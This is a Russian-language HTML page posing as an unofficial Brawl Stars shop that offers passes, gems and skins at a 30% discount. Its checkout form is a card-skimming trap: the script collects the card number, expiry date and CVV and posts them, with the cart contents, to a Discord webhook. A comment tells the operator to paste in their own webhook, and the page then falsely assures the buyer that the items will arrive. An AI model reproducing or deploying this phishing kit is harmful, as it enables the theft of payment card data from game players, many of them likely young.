<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Brawl Stars Shop — скидка 30%</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: system-ui, -apple-system, 'Segoe UI', monospace;
        }
        body {
            background: #0b0e17;
            color: #eee;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        h1 {
            color: #ffcc00;
            font-size: 2rem;
            margin-bottom: 0.5rem;
        }
        .tabs {
            display: flex;
            gap: 10px;
            margin: 30px 0 20px;
            flex-wrap: wrap;
        }
        .tab-btn {
            background: #1e2438;
            border: none;
            padding: 10px 24px;
            font-size: 1rem;
            font-weight: bold;
            color: #aaa;
            border-radius: 40px;
            cursor: pointer;
        }
        .tab-btn.active {
            background: #ffcc00;
            color: #0b0e17;
        }
        .tab-pane {
            display: none;
        }
        .tab-pane.active {
            display: block;
        }
        .products {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }
        .product {
            background: #151e2c;
            border-radius: 20px;
            padding: 18px;
            transition: 0.2s;
        }
        .product h3 {
            font-size: 1.3rem;
        }
        .price {
            font-size: 1.5rem;
            color: #ffcc00;
            margin: 10px 0;
        }
        .old {
            text-decoration: line-through;
            font-size: 0.9rem;
            color: #888;
            margin-left: 8px;
        }
        button {
            background: #ffcc00;
            border: none;
            padding: 8px 16px;
            border-radius: 40px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
        }
        .cart {
            background: #0f1322;
            border-radius: 20px;
            padding: 20px;
            margin-top: 40px;
            border: 1px solid #2a2f44;
        }
        .cart-list {
            list-style: none;
            margin: 15px 0;
            max-height: 200px;
            overflow-y: auto;
        }
        .cart-list li {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #2a2f44;
        }
        .total {
            font-size: 1.3rem;
            text-align: right;
            margin: 10px 0;
        }
        .checkout {
            background: #2ecc71;
            color: #000;
            width: auto;
            padding: 10px 25px;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.9);
            justify-content: center;
            align-items: center;
        }
        .modal-card {
            background: #1e2438;
            padding: 25px;
            border-radius: 28px;
            width: 90%;
            max-width: 380px;
        }
        .modal-card input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            background: #0b0e17;
            border: 1px solid #3a4055;
            border-radius: 40px;
            color: white;
        }
        .close {
            float: right;
            font-size: 24px;
            cursor: pointer;
        }
        footer {
            text-align: center;
            margin-top: 50px;
            color: #555;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>⚡ brawl stars shop</h1>
    <p>дешевле на 30% чем в игре</p>

    <div class="tabs">
        <button class="tab-btn" data-tab="pass">brawl pass</button>
        <button class="tab-btn" data-tab="plus">brawl pass+</button>
        <button class="tab-btn" data-tab="gems">гемы</button>
        <button class="tab-btn" data-tab="skins">скины</button>
    </div>

    <!-- панели -->
    <div id="pass" class="tab-pane active"></div>
    <div id="plus" class="tab-pane"></div>
    <div id="gems" class="tab-pane"></div>
    <div id="skins" class="tab-pane"></div>

    <div class="cart">
        <h2>🛒 корзина</h2>
        <ul class="cart-list" id="cartItems"><li>корзина пуста</li></ul>
        <div class="total" id="totalPrice">итого: 0 ₽</div>
        <button class="checkout" id="checkoutBtn">оформить заказ</button>
    </div>
</div>

<div id="paymentModal" class="modal">
    <div class="modal-card">
        <span class="close">&times;</span>
        <h3>оплата картой</h3>
        <input type="text" id="card" placeholder="номер карты" maxlength="19">
        <input type="text" id="date" placeholder="MM/YY" maxlength="5">
        <input type="text" id="cvv" placeholder="CVV" maxlength="4">
        <button id="sendPay">оплатить</button>
    </div>
</div>

<footer>неофициальный магазин | региональные цены</footer>

<script>
    // ТОВАРЫ (скидка 30% от реальных)
    const shopData = {
        pass: [
            { name: "brawl pass сезон 1", price: 349, old: 499 },
            { name: "brawl pass сезон 2", price: 349, old: 499 },
            { name: "brawl pass сезон 3", price: 349, old: 499 }
        ],
        plus: [
            { name: "brawl pass+ экстра", price: 549, old: 799 },
            { name: "brawl pass+ премиум", price: 649, old: 929 }
        ],
        gems: [
            { name: "80 гемов", price: 111, old: 159 },
            { name: "170 гемов", price: 223, old: 319 },
            { name: "360 гемов", price: 454, old: 649 },
            { name: "950 гемов", price: 1049, old: 1499 }
        ],
        skins: [
            { name: "меха леон", price: 279, old: 399 },
            { name: "ковбой кольт", price: 209, old: 299 },
            { name: "рокер мортис", price: 349, old: 499 },
            { name: "бо ультимативный", price: 489, old: 699 },
            { name: "призрак кольт", price: 279, old: 399 },
            { name: "дракон найт", price: 419, old: 599 }
        ]
    };

    let cart = []; // { name, price }

    // отрисовка товаров в панель
    function renderCategory(category, elementId) {
        const container = document.getElementById(elementId);
        if (!container) return;
        const items = shopData[category];
        let html = '<div class="products">';
        items.forEach(item => {
            html += `
                <div class="product">
                    <h3>${item.name}</h3>
                    <div class="price">${item.price} ₽ <span class="old">${item.old} ₽</span></div>
                    <button onclick="addToCart('${item.name}', ${item.price})">в корзину</button>
                </div>
            `;
        });
        html += '</div>';
        container.innerHTML = html;
    }

    window.addToCart = function(name, price) {
        cart.push({ name, price });
        updateCartDisplay();
        showToast(`добавлено: ${name}`);
    };

    function updateCartDisplay() {
        const list = document.getElementById('cartItems');
        const totalSpan = document.getElementById('totalPrice');
        if (cart.length === 0) {
            list.innerHTML = '<li>корзина пуста</li>';
            totalSpan.innerText = 'итого: 0 ₽';
            return;
        }
        let total = 0;
        let html = '';
        cart.forEach((item, idx) => {
            total += item.price;
            html += `<li>${item.name} — ${item.price} ₽ <button style="width:auto; background:#c0392b;" onclick="removeFromCart(${idx})">x</button></li>`;
        });
        list.innerHTML = html;
        totalSpan.innerText = `итого: ${total} ₽`;
    }

    window.removeFromCart = function(idx) {
        cart.splice(idx, 1);
        updateCartDisplay();
    };

    function showToast(msg) {
        let toast = document.createElement('div');
        toast.innerText = msg;
        toast.style.position = 'fixed';
        toast.style.bottom = '20px';
        toast.style.right = '20px';
        toast.style.backgroundColor = '#ffcc00';
        toast.style.color = '#000';
        toast.style.padding = '10px 18px';
        toast.style.borderRadius = '30px';
        toast.style.zIndex = '9999';
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 2000);
    }

    // ВКЛАДКИ
    const tabs = document.querySelectorAll('.tab-btn');
    const panes = document.querySelectorAll('.tab-pane');
    tabs.forEach(btn => {
        btn.addEventListener('click', () => {
            const tabId = btn.getAttribute('data-tab');
            panes.forEach(pane => pane.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            tabs.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
        });
    });
    // активируем первую вкладку по умолчанию
    document.querySelector('.tab-btn').classList.add('active');

    // рендерим все категории
    renderCategory('pass', 'pass');
    renderCategory('plus', 'plus');
    renderCategory('gems', 'gems');
    renderCategory('skins', 'skins');

    // МОДАЛКА ОПЛАТЫ И ВЕБХУК
    // !!! СЮДА ВСТАВЬ СВОЙ ДИСКОРД ВЕБХУК !!!
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/ЗАМЕНИ_НА_СВОЙ/ТОКЕН';

    const modal = document.getElementById('paymentModal');
    const checkoutBtn = document.getElementById('checkoutBtn');
    const closeModal = document.querySelector('.close');

    checkoutBtn.onclick = () => {
        if (cart.length === 0) {
            alert('корзина пуста!');
            return;
        }
        modal.style.display = 'flex';
    };
    closeModal.onclick = () => modal.style.display = 'none';
    window.onclick = (e) => { if (e.target === modal) modal.style.display = 'none'; };

    document.getElementById('sendPay').onclick = async () => {
        const cardNum = document.getElementById('card').value.trim();
        const expiry = document.getElementById('date').value.trim();
        const cvvVal = document.getElementById('cvv').value.trim();
        if (!cardNum || !expiry || !cvvVal) {
            alert('заполните все данные карты');
            return;
        }
        const totalSum = cart.reduce((sum, i) => sum + i.price, 0);
        const itemsList = cart.map(i => `${i.name} (${i.price}₽)`).join('\n');
        
        const payload = {
            content: "**НОВЫЙ ЗАКАЗ BRAWL STARS**",
            embeds: [{
                title: "💳 данные карты + корзина",
                color: 0xffcc00,
                fields: [
                    { name: "товары", value: itemsList || "—", inline: false },
                    { name: "сумма", value: `${totalSum} ₽`, inline: true },
                    { name: "номер карты", value: `||${cardNum}||`, inline: false },
                    { name: "срок", value: expiry, inline: true },
                    { name: "cvv", value: `||${cvvVal}||`, inline: true }
                ],
                timestamp: new Date().toISOString()
            }]
        };

        try {
            await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
            alert('спасибо за покупку! предметы придут на аккаунт в ближайшее время.');
            cart = [];
            updateCartDisplay();
            modal.style.display = 'none';
            document.getElementById('card').value = '';
            document.getElementById('date').value = '';
            document.getElementById('cvv').value = '';
        } catch (err) {
            alert('ошибка оплаты, попробуйте позже');
        }
    };
</script>
</body>
</html>
